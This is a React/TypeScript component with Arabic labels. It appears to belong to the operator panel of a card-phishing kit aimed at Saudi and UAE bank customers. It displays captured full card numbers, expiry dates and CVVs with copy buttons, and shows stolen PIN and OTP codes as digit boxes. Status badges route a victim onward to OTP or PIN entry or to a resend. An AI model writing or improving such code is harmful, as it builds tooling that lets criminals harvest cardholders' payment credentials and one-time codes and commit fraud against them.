"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase()
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national")) return "/logo-snb.png"
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png"
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg"
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png"
  return null
}

interface CardTheme {
  gradient: string
  shadow: string
  light: boolean
}

const getBankCardTheme = (bankName: string, brand: string): CardTheme => {
  const n = (bankName || "").toLowerCase()

  // ── Saudi banks ──────────────────────────────────────────────────────────
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national commercial"))
    return { gradient: "linear-gradient(135deg, #0f6a46 0%, #0b5e38 48%, #08462a 100%)", shadow: "0 6px 24px rgba(8,60,36,0.45)", light: false }

  if (n.includes("راجح") || n.includes("rajhi"))
    return { gradient: "linear-gradient(135deg, #163d7a 0%, #1e5aa8 52%, #2f79c7 100%)", shadow: "0 6px 24px rgba(22,61,122,0.45)", light: false }

  if (n.includes("رياض") || n.includes("riyad"))
    return { gradient: "linear-gradient(135deg, #0e1e5c 0%, #17358b 58%, #22a36a 100%)", shadow: "0 6px 24px rgba(14,30,92,0.45)", light: false }

  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma"))
    return { gradient: "linear-gradient(135deg, #0b3f6f 0%, #145b96 50%, #c89a2b 100%)", shadow: "0 6px 24px rgba(11,63,111,0.45)", light: false }

  if (n.includes("فرنس") || n.includes("fransi"))
    return { gradient: "linear-gradient(135deg, #7f1400 0%, #c32200 54%, #f05a24 100%)", shadow: "0 6px 24px rgba(127,20,0,0.45)", light: false }

  if (n.includes("ساب") || n.includes("sabb") || n.includes("hsbc"))
    return { gradient: "linear-gradient(135deg, #8b0000 0%, #b00000 50%, #cc0000 100%)", shadow: "0 6px 24px rgba(139,0,0,0.45)", light: false }

  if (n.includes("بلاد") || n.includes("bilad"))
    return { gradient: "linear-gradient(135deg, #7a5a18 0%, #b48827 56%, #d5b35a 100%)", shadow: "0 6px 24px rgba(122,90,24,0.4)", light: false }

  if (n.includes("جزيرة") || n.includes("aljazira") || n.includes("jazira"))
    return { gradient: "linear-gradient(135deg, #2c2f36 0%, #43474f 54%, #b91c1c 100%)", shadow: "0 6px 24px rgba(44,47,54,0.45)", light: false }

  if (n.includes("عربي") || n.includes("arab national") || n.includes("anb"))
    return { gradient: "linear-gradient(135deg, #001f66 0%, #003399 50%, #0044bb 100%)", shadow: "0 6px 24px rgba(0,31,102,0.45)", light: false }

  if (n.includes("عوده") || n.includes("awwal") || n.includes("stc bank"))
    return { gradient: "linear-gradient(135deg, #6b0080 0%, #8b00a8 50%, #a000c0 100%)", shadow: "0 6px 24px rgba(107,0,128,0.45)", light: false }

  if (n.includes("الخليج") || n.includes("gulf") || n.includes("bsf"))
    return { gradient: "linear-gradient(135deg, #003b5c 0%, #005a8a 50%, #0070aa 100%)", shadow: "0 6px 24px rgba(0,59,92,0.45)", light: false }

  if (n.includes("أبوظبي") || n.includes("abu dhabi") || n.includes("fab") || n.includes("adib"))
    return { gradient: "linear-gradient(135deg, #003a70 0%, #005aaa 50%, #006ec7 100%)", shadow: "0 6px 24px rgba(0,58,112,0.45)", light: false }

  if (n.includes("emirates nbd") || n.includes("الإمارات دبي الوطني"))
    return { gradient: "linear-gradient(135deg, #7a0016 0%, #d63a1f 54%, #f08a24 100%)", shadow: "0 6px 24px rgba(122,0,22,0.42)", light: false }

  if (n.includes("mashreq") || n.includes("المشرق"))
    return { gradient: "linear-gradient(135deg, #0d5b9e 0%, #1276c9 52%, #ef7d00 100%)", shadow: "0 6px 24px rgba(13,91,158,0.42)", light: false }

  if (n.includes("dubai islamic") || n.includes("دبي الإسلامي") || n.includes("dib"))
    return { gradient: "linear-gradient(135deg, #1f7a3c 0%, #248d46 56%, #b6922e 100%)", shadow: "0 6px 24px rgba(31,122,60,0.42)", light: false }

  // ── Network fallback ──────────────────────────────────────────────────────
  if (brand === "VISA")
    return { gradient: "linear-gradient(135deg, #1a1f71 0%, #22277a 50%, #2c3494 100%)", shadow: "0 6px 24px rgba(26,31,113,0.4)", light: false }

  if (brand === "MASTERCARD")
    return { gradient: "linear-gradient(135deg, #1a0a00 0%, #2d1200 50%, #3d1800 100%)", shadow: "0 6px 24px rgba(61,24,0,0.4)", light: false }

  if (brand === "MADA")
    return { gradient: "linear-gradient(135deg, #0b5e38 0%, #0e7a48 50%, #10915600 100%)", shadow: "0 6px 24px rgba(11,94,56,0.4)", light: false }

  // ── Default (light green) ────────────────────────────────────────────────
  return { gradient: "linear-gradient(135deg, #e8f5ee 0%, #ddf0e6 35%, #cce8d8 65%, #e2f0e8 100%)", shadow: "0 6px 24px rgba(0,100,50,0.12), 0 2px 6px rgba(0,0,0,0.06)", light: true }
}

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png"
  if (brand === "VISA") return "/logo-visa.png"
  if (brand === "MASTERCARD") return "/logo-mastercard.png"
  return null
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  showActions,
  isLatest,
  actions,
  icon,
  color: _color,
  layout: _layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const t = value.trim()
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد")
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false
    const fallback = () => {
      const el = document.createElement("textarea")
      el.value = normalized
      el.setAttribute("readonly", "")
      el.style.cssText = "position:fixed;top:-1000px;opacity:0"
      document.body.appendChild(el)
      el.focus()
      el.select()
      const ok = document.execCommand("copy")
      document.body.removeChild(el)
      return ok
    }
    if (navigator.clipboard && window.isSecureContext) {
      try { await navigator.clipboard.writeText(normalized); return true } catch { return fallback() }
    }
    return fallback()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) { toast.error("لا توجد قيمة قابلة للنسخ"); return }
    const ok = await copyWithFallback(value)
    if (!ok) { toast.error("تعذر نسخ القيمة"); return }
    setCopiedField(field)
    if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField(c => c === field ? null : c)
    }, 1500)
    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }

  const getStatusBadge = () => {
    if (!status) return null
    const badges: Record<string, { text: string; className: string }> = {
      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
    }
    const badge = badges[status]
    if (!badge) return null
    return (
      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts)
    const mm = String(d.getMonth() + 1).padStart(2, "0")
    const dd = String(d.getDate()).padStart(2, "0")
    let h = d.getHours()
    const min = String(d.getMinutes()).padStart(2, "0")
    const ampm = h >= 12 ? "م" : "ص"
    h = h % 12 || 12
    return `${mm}-${dd} | ${h}:${min} ${ampm}`
  }

  const isCardData = title === "معلومات البطاقة" || !!data["رقم البطاقة"] || !!data["نوع البطاقة"]

  if (isCardData) {
    const rawNum     = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "")
    const cardNumber = rawNum ? (rawNum.match(/.{1,4}/g)?.join("  ") || rawNum) : "••••  ••••  ••••  ••••"
    const rawExpiry  = (data["تاريخ الانتهاء"] || "").toString().trim()
    const expiry     = rawExpiry || "••/••"
    const rawCvv     = (data["CVV"] || "").toString().trim()
    const cvv        = rawCvv || "•••"
    const holder     = data["اسم حامل البطاقة"] || "CARD HOLDER"
    const cardType   = (data["نوع البطاقة"] || "CARD").toString().toUpperCase()
    const cardLevel  = (data["مستوى البطاقة"] || "").toString().trim()
    const bankName   = data["البنك"] || ""
    const bankCountry = data["بلد البنك"] || ""

    const typeLower  = cardType.toLowerCase()
    let brand = "CARD"
    if (typeLower.includes("visa"))   brand = "VISA"
    else if (typeLower.includes("master")) brand = "MASTERCARD"
    else if (typeLower.includes("mada"))   brand = "MADA"
    else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"

    const bankLogoUrl = getBankLogoUrl(bankName)
    const networkLogoUrl = getNetworkLogoUrl(brand)
    const theme = getBankCardTheme(bankName, brand)
    const tc = "#111827"
    const tc2 = "#6b7280"
    const accent = theme.light ? "#2563eb" : "#1d4ed8"

    return (
      <div className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100" style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}>

        {/* Bubble header */}
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
          <div className="flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
            )}
          </div>
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>

        <div className="p-5">
          <div className="flex items-center justify-between mb-5">
            <div>{getStatusBadge()}</div>
            <span
              className="inline-flex items-center rounded-lg border px-3 py-1 text-xs font-bold"
              style={{ color: tc, borderColor: "#d1d5db", background: "#ffffff" }}
            >
              SAR
            </span>
          </div>

          <div className="space-y-4">
            <div className="grid grid-cols-[auto_1fr] items-end gap-x-6 gap-y-1">
              <div className="text-right">
                <div className="text-[11px] font-semibold" style={{ color: tc2 }}>تاريخ الانتهاء</div>
                <button
                  type="button"
                  onClick={() => void handleCopy("expiryDate", rawExpiry)}
                  disabled={!isCopyableValue(rawExpiry)}
                  className="font-mono text-[2.15rem] font-bold leading-none hover:opacity-70 transition-opacity"
                  style={{ direction: "ltr", color: tc }}
                >
                  {copiedField === "expiryDate" ? "✓" : expiry}
                </button>
              </div>

              <div className="min-w-0">
                <div className="text-[11px] font-semibold mb-1" style={{ color: tc2 }}>رقم البطاقة</div>
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="w-full text-left font-mono text-[2.15rem] font-bold leading-none tracking-[0.08em] hover:opacity-70 transition-opacity"
                  style={{ direction: "ltr", color: tc }}
                >
                  {cardNumber}
                </button>
              </div>
            </div>

            <div>
              <div className="text-[11px] font-semibold mb-1" style={{ color: tc2 }}>CVV</div>
              <button
                type="button"
                onClick={() => void handleCopy("cvv", rawCvv)}
                disabled={!isCopyableValue(rawCvv)}
                title="نسخ CVV"
                className="font-mono text-[2rem] font-bold leading-none hover:opacity-70 transition-opacity"
                style={{ direction: "ltr", color: tc }}
              >
                {copiedField === "cvv" ? "✓" : cvv}
              </button>
            </div>

            <div className="grid grid-cols-2 gap-x-8 gap-y-4 pt-2">
              <div className="space-y-3">
                <div className="flex items-center gap-3">
                  {networkLogoUrl ? (
                    <img src={networkLogoUrl} alt={brand} className="h-8 max-w-[84px] object-contain" />
                  ) : (
                    <span className="text-lg font-black uppercase" style={{ color: accent }}>{brand}</span>
                  )}
                  <span className="text-sm font-semibold" style={{ color: tc }}>
                    {cardType === "CARD" ? "غير محدد" : cardType}
                  </span>
                </div>
                <div className="text-sm" style={{ color: tc }}>
                  <span className="font-semibold">الاسم:</span>{" "}
                  <span style={{ direction: "ltr", display: "inline-block" }}>{holder}</span>
                </div>
                <div className="text-sm" style={{ color: tc }}>
                  <span className="font-semibold">البنك:</span> {bankName || "غير محدد"}
                </div>
                {bankCountry && bankCountry !== "غير محدد" && (
                  <div className="text-sm" style={{ color: tc }}>
                    <span className="font-semibold">الدولة:</span> {bankCountry}
                  </div>
                )}
              </div>

              <div className="space-y-3">
                {bankLogoUrl && (
                  <div className="rounded-xl border border-gray-200 bg-white p-3 inline-flex">
                    <img src={bankLogoUrl} alt={bankName} className="h-10 max-w-[140px] object-contain" />
                  </div>
                )}
                {cardLevel && (
                  <div className="text-sm" style={{ color: tc }}>
                    <span className="font-semibold">المستوى:</span> {cardLevel}
                  </div>
                )}
                <div className="text-sm" style={{ color: tc }}>
                  <span className="font-semibold">النسخة:</span> {brand}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* ─── Footer: status + actions ─── */}
        {showActions && actions && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
            <div className="text-[11px] text-gray-400">
              {copiedField ? "تم نسخ القيمة" : "انقر على الحقول لنسخها"}
            </div>
            <div>{actions}</div>
          </div>
        )}
      </div>
    )
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") || title.includes("OTP") ||
    title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")

  let digitValue = ""
  if (isPinOrOtp) {
    const entries = Object.entries(data)
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || ""
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
    >
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
        <div className="flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
          )}
        </div>
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
      </div>

      {/* Body */}
      <div className="px-4 py-3">
        {isPinOrOtp && digitValue ? (
          <div className="flex justify-center gap-1.5 py-2" style={{ direction: "ltr" }}>
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-9 h-11 rounded-lg bg-gray-50 border border-gray-200 shadow-sm flex items-center justify-center"
              >
                <span className="text-xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="divide-y divide-gray-50">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              const str = value?.toString() || "-"
              return (
                <div key={key} className="flex items-start justify-between gap-4 py-2 text-sm">
                  <span className="text-gray-500 shrink-0 text-xs">{key}</span>
                  <span className="text-gray-900 font-semibold text-right break-all text-xs">{str}</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
          <div>{getStatusBadge()}</div>
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  )
}
